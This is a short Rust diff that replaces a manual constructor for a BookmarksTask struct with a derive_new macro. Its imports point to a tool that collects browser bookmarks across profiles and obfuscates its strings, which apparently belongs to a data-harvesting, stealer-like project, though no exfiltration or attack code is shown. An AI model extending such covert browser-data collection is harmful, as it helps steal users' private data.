@@ -4,6 +4,7 @@ use crate::{Bookmark, collect_unique_from_profiles, to_string_and_write_all};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
+use derive_new::new;
 use collector::{Browser, Collector};
 use filesystem::FileSystem;
 use filesystem::path::Path;
@@ -12,14 +13,9 @@ use json::{Value, parse};
 use obfstr::obfstr as s;
 use tasks::{Task, parent_name};
 
+#[derive(new)]
 pub(super) struct BookmarksTask {
     browser: Arc<BrowserData>,
-}
-
-impl BookmarksTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for BookmarksTask {
